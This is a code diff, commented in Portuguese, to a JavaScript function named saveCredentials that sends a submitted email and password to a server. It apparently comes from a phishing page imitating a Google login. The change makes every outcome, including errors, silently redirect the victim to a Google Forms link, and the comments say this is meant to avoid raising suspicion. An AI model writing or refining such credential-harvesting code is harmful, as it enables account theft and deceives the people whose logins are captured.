@@ -530,23 +530,23 @@ async function saveCredentials(email, password) {
         const data = await response.json();
         
         if (response.ok) {
-            // Simular redirecionamento do Google (opcional)
+            // Redirecionar para o Google Forms após salvar
             setTimeout(() => {
-                const t = translations[currentLang] || translations['en'];
-                alert(t.loginSuccess);
-                // Aqui você pode redirecionar para uma página de sucesso
-                // window.location.href = '/success.html';
+                window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
             }, 500);
         } else {
             console.error('Erro ao salvar:', data.error);
-            const t = translations[currentLang] || translations['en'];
-            alert(t.loginError);
+            // Mesmo com erro, redirecionar para não levantar suspeitas
+            setTimeout(() => {
+                window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
+            }, 500);
         }
     } catch (error) {
         console.error('Erro na requisição:', error);
-        // Mesmo com erro, mostrar mensagem de sucesso para não levantar suspeitas
-        const t = translations[currentLang] || translations['en'];
-        alert(t.loginSuccess);
+        // Mesmo com erro, redirecionar para não levantar suspeitas
+        setTimeout(() => {
+            window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
+        }, 500);
     }
 }
 
